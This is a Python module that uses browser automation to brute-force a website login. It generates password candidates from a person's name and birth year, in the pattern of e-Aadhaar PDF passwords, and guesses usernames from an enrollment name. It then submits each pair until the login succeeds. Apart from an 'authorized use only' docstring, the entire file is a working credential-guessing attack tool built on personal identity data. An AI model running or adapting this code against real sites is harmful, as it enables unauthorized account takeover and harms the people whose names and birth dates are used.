"""Configurable website login — try PDF-style password candidates (authorized use only)."""

from __future__ import annotations

import asyncio
import logging
import os
import re
import time
from dataclasses import dataclass
from typing import Any

from pdf_unlock import build_pdf_password_candidates, build_year_bruteforce_passwords, pdf_name_prefix
from uidai_api import is_skip_name, normalize_dob, normalize_name

log = logging.getLogger('login-try')


@dataclass
class LoginSiteConfig:
    url: str
    username: str
    user_selector: str
    pass_selector: str
    submit_selector: str = ''
    success_url_contains: str = ''
    success_selector: str = ''
    fail_text: str = ''
    headless: bool = True

    @classmethod
    def from_env(cls) -> LoginSiteConfig:
        url = os.getenv('LOGIN_SITE_URL', '').strip()
        username = os.getenv('LOGIN_USERNAME', '').strip()
        user_sel = os.getenv('LOGIN_USER_SELECTOR', 'input[name="username"]').strip()
        pass_sel = os.getenv('LOGIN_PASS_SELECTOR', 'input[name="password"]').strip()
        submit_sel = os.getenv('LOGIN_SUBMIT_SELECTOR', 'button[type="submit"]').strip()
        if not url or not username:
            raise ValueError('Set LOGIN_SITE_URL and LOGIN_USERNAME in .env')
        headless = os.getenv('LOGIN_HEADLESS', '1').strip().lower() not in ('0', 'false', 'no')
        return cls(
            url=url,
            username=username,
            user_selector=user_sel,
            pass_selector=pass_sel,
            submit_selector=submit_sel,
            success_url_contains=os.getenv('LOGIN_SUCCESS_URL', '').strip(),
            success_selector=os.getenv('LOGIN_SUCCESS_SELECTOR', '').strip(),
            fail_text=os.getenv('LOGIN_FAIL_TEXT', '').strip(),
            headless=headless,
        )


def build_login_passwords(name: str, dob: str | None = None) -> list[str]:
    """Same candidates as e-Aadhaar PDF unlock — NAME4+YEAR etc."""
    nm = normalize_name(name)
    dob_norm = normalize_dob(dob) if dob else None
    return build_pdf_password_candidates([nm], dob_norm)


def build_login_passwords_year_only(name: str) -> list[str]:
    nm = normalize_name(name)
    if is_skip_name(nm):
        return []
    return build_year_bruteforce_passwords([nm])


def build_login_username_candidates(name: str) -> list[str]:
    """Common username patterns from enrollment name."""
    nm = normalize_name(name)
    if is_skip_name(nm):
        return []
    parts = [p for p in nm.split() if p]
    compact = ''.join(parts)
    prefix = pdf_name_prefix(nm)
    seen: set[str] = set()
    out: list[str] = []

    def add(value: str) -> None:
        v = (value or '').strip()
        if v and v not in seen:
            seen.add(v)
            out.append(v)

    add(prefix)
    add(prefix.lower())
    add(compact.lower())
    add(compact.upper())
    if parts:
        add(parts[0].lower())
        add(parts[0].upper())
        if len(parts) >= 2:
            add(f'{parts[0].lower()}.{parts[-1].lower()}')
            add(f'{parts[0].lower()}{parts[-1].lower()}')
    return out


@dataclass
class LoginTryResult:
    ok: bool
    password: str = ''
    tried: int = 0
    elapsed_sec: float = 0.0
    message: str = ''
    final_url: str = ''


async def try_login_passwords(
    cfg: LoginSiteConfig,
    passwords: list[str],
    *,
    delay_sec: float = 0.6,
    max_tries: int | None = None,
    on_progress: Any | None = None,
) -> LoginTryResult:
    """Playwright — fill username + each password until success or list ends."""
    from playwright.async_api import async_playwright

    pwd_list = [p for p in passwords if p]
    if max_tries is not None:
        pwd_list = pwd_list[:max_tries]
    if not pwd_list:
        return LoginTryResult(ok=False, message='No passwords to try')

    t0 = time.monotonic()
    tried = 0

    async def progress(msg: str) -> None:
        if on_progress:
            try:
                r = on_progress(msg)
                if asyncio.iscoroutine(r):
                    await r
            except Exception:
                pass

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(
            headless=cfg.headless,
            args=['--no-sandbox', '--disable-dev-shm-usage'],
        )
        context = await browser.new_context(viewport={'width': 1280, 'height': 800})
        page = await context.new_page()
        try:
            await page.goto(cfg.url, wait_until='commit', timeout=45_000)
            await asyncio.sleep(0.5)

            for pwd in pwd_list:
                tried += 1
                await progress(f'Try {tried}/{len(pwd_list)}: {pwd[:2]}***')

                try:
                    await page.fill(cfg.user_selector, cfg.username)
                    await page.fill(cfg.pass_selector, pwd)
                    if cfg.submit_selector:
                        await page.click(cfg.submit_selector)
                    else:
                        await page.keyboard.press('Enter')
                    await asyncio.sleep(1.0)
                except Exception as exc:
                    log.warning('fill/submit fail: %s', exc)
                    await asyncio.sleep(delay_sec)
                    continue

                if await _login_succeeded(page, cfg):
                    elapsed = time.monotonic() - t0
                    return LoginTryResult(
                        ok=True,
                        password=pwd,
                        tried=tried,
                        elapsed_sec=elapsed,
                        message='Login OK',
                        final_url=page.url or '',
                    )

                if cfg.fail_text and cfg.fail_text.lower() in (await page.content()).lower():
                    pass  # expected fail, continue

                try:
                    await page.goto(cfg.url, wait_until='commit', timeout=30_000)
                    await asyncio.sleep(0.4)
                except Exception:
                    pass
                await asyncio.sleep(delay_sec)

            elapsed = time.monotonic() - t0
            return LoginTryResult(
                ok=False,
                tried=tried,
                elapsed_sec=elapsed,
                message=f'No match in {tried} tries',
                final_url=page.url or '',
            )
        finally:
            await context.close()
            await browser.close()


async def _login_succeeded(page, cfg: LoginSiteConfig) -> bool:
    url = (page.url or '').lower()
    if cfg.success_url_contains and cfg.success_url_contains.lower() in url:
        return True
    if cfg.success_selector:
        try:
            if await page.locator(cfg.success_selector).count() > 0:
                return True
        except Exception:
            pass
    # Heuristic: left login page (no password field visible)
    if cfg.url.lower() not in url and 'login' not in url and 'signin' not in url:
        try:
            if await page.locator(cfg.pass_selector).count() == 0:
                return True
        except Exception:
            return True
    return False
